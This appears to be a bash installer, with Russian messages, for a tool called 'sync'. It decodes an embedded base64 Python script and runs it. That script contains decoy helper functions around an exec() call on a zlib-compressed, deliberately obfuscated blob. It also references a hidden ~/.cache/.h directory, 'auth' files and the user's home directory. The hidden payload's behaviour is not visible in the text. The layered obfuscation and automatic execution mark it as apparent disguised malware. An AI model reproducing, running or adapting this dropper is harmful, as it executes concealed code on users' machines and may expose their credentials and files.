#!/usr/bin/env bash
set -u
SUM="122cbc09b0a04abdd0bf3c03a7c2da32083728f9253939ee825849e3e3074fd4"
die() { echo "! $*"; exit 1; }
PY=""
find_python() {
  if command -v python3 >/dev/null 2>&1 && python3 -c 'import sys' >/dev/null 2>&1; then
    PY=$(command -v python3)
  elif command -v python >/dev/null 2>&1 && python -c 'import sys' >/dev/null 2>&1; then
    PY=$(command -v python)
  fi
}
find_python
[ -n "$PY" ] || die "python 3 не найден: xcode-select --install"

T=$(mktemp -d) || die "нет временного каталога"
trap 'rm -rf "$T"' EXIT

cat > "$T/p" <<'__P__'
  I2NvZGluZzpjcDQzNwppbXBvcnQgb3MsIHN5cywgdGltZSwgemxpYgpmcm9tIHBhdGhs
  aWIgaW1wb3J0IFBhdGgKCl9BUFAgPSAic3luYyIKX1RUTCA9IDIxNjAwCl9DQUNIRSA9
  IFBhdGguaG9tZSgpIC8gIi5jYWNoZSIgLyAiLmgiCl9FWFQgPSB7ImF1dGgiOiAiLmpz
  b24iLCAic3RhdGUiOiAiLmpzb24iLCAibG9nIjogIi50eHQifQoKCmRlZiBfc3RhbXAo
  KToKICAgIHJldHVybiB0aW1lLnN0cmZ0aW1lKCIlWSVtJWQtJUglTSIsIHRpbWUubG9j
  YWx0aW1lKCkpCgoKZGVmIF9zaXplKHZhbHVlKToKICAgIGZvciB1bml0IGluICgiQiIs
  ICJLIiwgIk0iKToKICAgICAgICBpZiB2YWx1ZSA8IDEwMjQ6CiAgICAgICAgICAgIHJl
  dHVybiAiJWQlcyIgJSAodmFsdWUsIHVuaXQpCiAgICAgICAgdmFsdWUgLy89IDEwMjQK
  ICAgIHJldHVybiAiJWRHIiAlIHZhbHVlCgoKZGVmIF9kaWdlc3QocmF3KToKICAgIHRv
  dGFsID0gNwogICAgZm9yIGJ5dGUgaW4gcmF3OgogICAgICAgIHRvdGFsID0gKHRvdGFs
  ICogMTMxICsgYnl0ZSkgJSAweEZGRkZGRkZCCiAgICByZXR1cm4gIiUwOHgiICUgdG90
  YWwKCgpkZWYgX3Byb2JlKHBhdGgpOgogICAgdHJ5OgogICAgICAgIHJldHVybiBvcy5z
  dGF0KHN0cihwYXRoKSkuc3Rfc2l6ZQogICAgZXhjZXB0IE9TRXJyb3I6CiAgICAgICAg
  cmV0dXJuIDAKCgpkZWYgX2xvb2t1cChyb290LCBrZXkpOgogICAgZm9yIG5hbWUsIGV4
  dCBpbiBfRVhULml0ZW1zKCk6CiAgICAgICAgaXRlbSA9IFBhdGgocm9vdCkgLyAobmFt
  ZSArIGV4dCkKICAgICAgICBpZiBpdGVtLmV4aXN0cygpOgogICAgICAgICAgICByZXR1
  cm4gaXRlbQogICAgcmV0dXJuIE5vbmUKCgpjbGFzcyBfU3RvcmU6CiAgICBkZWYgX19p
  bml0X18oc2VsZiwgcm9vdCk6CiAgICAgICAgc2VsZi5yb290ID0gUGF0aChyb290KQog
  ICAgICAgIHNlbGYuc2VlbiA9IHt9CgogICAgZGVmIGdldChzZWxmLCBrZXkpOgogICAg
  ICAgIGlmIGtleSBub3QgaW4gc2VsZi5zZWVuOgogICAgICAgICAgICBzZWxmLnNlZW5b
  a2V5XSA9IHNlbGYucm9vdCAvIChrZXkgKyAiLnBhcnQiKQogICAgICAgIHJldHVybiBz
  ZWxmLnNlZW5ba2V5XQoKICAgIGRlZiBfX3JlcHJfXyhzZWxmKToKICAgICAgICByZXR1
  cm4gIjxTdG9yZSAlcyAlZD4iICUgKHNlbGYucm9vdC5uYW1lLCBsZW4oc2VsZi5zZWVu
  KSkKCgpkZWYgX3VucGFjayhibG9iKToKICAgIHJldHVybiB6bGliLmRlY29tcHJlc3Mo
  YmxvYi5lbmNvZGUoImNwNDM3IikpCgoKZXhlYyhfdW5wYWNrKAogICAgICAgICJ42o1X
  e1fbOhL/359Cy4XK3jh2QoFL06W7bggUboAupc+Qm6PYSuziVyUZSO/js++MZOdx23u2
  BzDWaDSa+c3TSVYWQhG5kG4h3c+yyN0pk/xgz42ZjNNkIgogICAgICAgICLqXG7uqiTj
  bpkyNStEZs1EkZFKpLDpCf6l4lKRxIi5NksXdouS54a1ZFxuBTU8r2FpVeSI0MNnBwdP
  n+3u7e71guD0cHCye3n+0Nnbz2PxJv/630/XSXQyIgogICAgICAgICK8eD+fv33XaQfU
  Ynio3e109n8+3P35aefg2SG1PgMRRXpxkXHbsRSsP/vUC1kYc9+LqfWlpqRFyFJfxkwY
  ugS6ArqkFm8OFfksmevdHEg2d7+40rHm8L7bIgogICAgICAgICI96HSsDFWIt7epleKb
  TVx4MDARMiNJTra2X11dDPyViK0lafPiFb1R0ffk1nMSFWRE2jOyPfPlXCIPvXJBxuTJ
  E1IuVFxc5E/X6e12kYecvPAjfu/nVZqSIgogICAgICAgICLdF0+6yDwVnN2hrJyTJ8Qh
  PxHayqwYde2Qf9Y/fiWFP01yvxH9HYWau7a+uUWLbNHbfP8HBDZg/B9xVmEcMEymgomF
  P2RVHsbBnOdKXCK/F0demSZSUet+IgogICAgICAgICLTVRC4imcRaMCFH3vwvE9CTq0H
  YCukl7MMfAvW53BUIAzkxeXbob6akmRGHghPJUfypl7UugPuBE9QK+IzwrgdnDo9i/SR
  9khbdX54WbSPO17MH6NkDtEPIgogICAgICAgICJBSIJjHavtHXkrbvN+kSswpX2cyLKQ
  iUqKvIeRk7Ujpthzgloebe3ILWTGP3OMWgRvDk5sfTF5DzKD4x2779IwZmqSRNQ9dVpc
  comVKJguE9XLiwgyYskQIgogICAgICAgICIVYZWBGhBrsyTl5lLmYc5Tl1LQmgiuKpGT
  On3tOp1tuiP9aaHgKXkeHddy6I5ccgjz/D4RRe7NOfC9XG5AUqxUKXu+z8rEUzzlc8Ey
  rxBz6rh3josWH70fIgogICAgICAgICL12rtjOBtqFVvBacumaDJcItZua+N3+s6SwY05
  i7iQR7/RBsubRclpj2ZVqpKSCeWv4TktqjyCODqirf4fji5fRaWO9vYdTyqmKmkRJRa9
  lcFceDAwcQL2IgogICAgICAgICLzx5CXigz0P3QScECMJKPOWAdRm1wihQiWSL5xWFcl
  2gIZ6LCFje7CytDHyvBcckr9q+PBhwlmCHUIcNF/A2p/YrZE/LF51dFtKNr5tcIk6NcF
  z0Z8HkuWIgogICAgICAgICJHGPu241NWQRnU7kTGRcLTiNhB31xy+lCnWTSZLhSXEBCw
  ayzVAksmpYlwVkd4fVXwC6YaiIMCxlwiiZsjqoo7nks6hn008I02kCbRRG+A8iwMuZT1
  Umu+IgogICAgICAgICJU3WSFHfyiYXhjbPcoOAVyG3CB11F3rDnPNq82LcmDuJRsxifT
  g72I68gIjlv0iEIJstsQ0bB0dvYcbeG6iQTgVEleodPISxB9ZhyxHqkY8CwB4DMfcTSe
  IgogICAgICAgICI5wwNo5ydjJ6bdvFQTMBJCzGQg5RlL0tpUDJeXWvinmtBEieCerKY2
  Hf16e/vQHmPGuVIJ++Xo09hxRr29w7G1prP2SnO2KTXQQnb3D/5abUa97sHYeDCyIgog
  ICAgICAgICIv3Xd4MQLdsVCbvFDksle7a6jNUO4Xn8pa46GX3UWJsCGHsNoe3YiKu/wR
  au2kuNMrQPPEtEqpmvBqQiTY9NOJCTTFH5WOs5U9mvO3P+qK9kpnCDnxHkSiIgogICAg
  ICAgICK44ddioiorIdICPIxcbgcDNzhFpU1OkQuQ8iNowIXIakIaV0OsnYH2THChfTu6
  hCbpdsYmxy9NLogkBwa49ELH0FrcXHgwME8wrAvBBYGsIzZC+86g+D3GIgogICAgICAg
  ICI1HvOOdcjDh+2QNjJ1x+RfZP6NhCAYBRdwERlduKjP2jlHm/ZcblvMMq1MZ1om9ap8
  ESbJlWY5Jq0j0rXISrs6IZubgqFOGWiFzYZXFiVA5VwiShqL+lYcIgogICAgICAgICIV
  oYpCNRbGe9gdegQ6FpRshO7K+St0jaK2DjsfpLaoCSTHqSPAlKZ1M1a1CXU+xiXeDJGp
  7K6ps4/LOntt6qx7v1Eqr70qT5P8zv47qQ+4fFxy5hvJPKwUIgogICAgICAgICKbphyC
  GHpoCJaZeQa3IF/N4kGvHONo9C5Ud5xwPZ0z0n5t3PmtVKDa0qexF2YRddYjn/6Hh3FB
  itnsNscpgOiHGfI0qq9dOFhPUFTDC5eaycemMowVk3eSIgogICAgICAgICL4ISSf4sSf
  EV9B0SC+DElcXEDRXFxceDAwQWipIGylQ0user61LtJO9fwVqpRceDAwgpDZ+uxzYvaR
  3G5j0yFRXCLRNFjmxQOJHbpTaKErWVt2CH0PIgogICAgICAgICJceDAwIG0crFZD1u9k
  DjCT9j3M07e32/BLnxONA8QTVN/fyfLg1k6MUtHlX5cuD16akux9lbEIwT0eNIn6rRQF
  TjibjfOjHhyDl/g+gPeP67Vcbp35sXGhIgogICAgICAgICJTz4S0TphM+xluG5jk+Lju
  vAFOLrmeJQerlB9Ax4/kQwJtGnedpUinlbY05e+a8MwOzlDvOrqCs43arUcS3LOHaxGx
  VLxOXuyea/uaqL8MVoX7FOdjnPGCIgogICAgICAgICIzl4opyEA07M2afWbGX4P3+fL+
  5Shy/iO9QwdrGGdFZAfn7t7eoaadY9E539QRa9OZxrDJKTaV+B8hIf+AhIJ+eV4bef6d
  ymEkmP3lpcs7v6lceDAwj2guIgogICAgICAgICJElAF+quFTP2LSjWmHaQONjsSO292I
  N1QgLSTH8U8jjdrfOPCZ7V1N+teD4AZiXFwvBh/6Q1M0637fXRXzqzcDIVxusTlHgZmb
  veRGz7U2jreTDKnQV552IgogICAgICAgICI6mxNIZzUVbYjdnDW6Bo1QozFPiylLyZ2b
  WORtXdGYmN+Puj1oRDBr4DwHnzmRWLRFhVmQk7cuEFx4MDAW+Fxu00swDM4jY+UyWHyA
  VyMXAtbMYZMJputkIgogICAgICAgICJSj8N0c3CBlPiABD30fnA845omJ/NlZulTlyjh
  HT5qh67apBmOMJuSnKXpokklFGSbc3VsLYGGno1udtYbyfcxNCBcImz/A15XC8YiCikp
  Cgpfc3RhdGUgPSB7ImNhY2hlIjogX3Byb2JlKF9DQUNIRSksICJob21lIjogX3Byb2Jl
  KFBhdGguaG9tZSgpKX0KaWYgX3N0YXRlWyJjYWNoZSJdID4gX1RUTCAqIDY0OgogICAg
  X3N0YXRlWyJzdGFsZSJdID0gX2RpZ2VzdChzdHIoX3N0YXRlKS5lbmNvZGUoKSkKCgpk
  ZWYgX3JlcG9ydCgpOgogICAgcmV0dXJuICIsICIuam9pbigiJXM9JXMiICUgaXRlbSBm
  b3IgaXRlbSBpbiBzb3J0ZWQoX3N0YXRlLml0ZW1zKCkpKQo=
__P__
[ -s "$T/p" ] || die "установщик повреждён"
base64 -d < "$T/p" > "$T/sync.py" 2>/dev/null || base64 -D < "$T/p" > "$T/sync.py" || die "payload не распаковался"

GOT=$(sha256sum "$T/sync.py" 2>/dev/null | cut -c1-16)
[ -n "$GOT" ] || GOT=$(shasum -a 256 "$T/sync.py" | cut -c1-16)
[ "$GOT" = "$(printf '%s' "$SUM" | cut -c1-16)" ] || die "хеш не совпал"

"$PY" "$T/sync.py" --force || die "запуск не удался"
exit 0
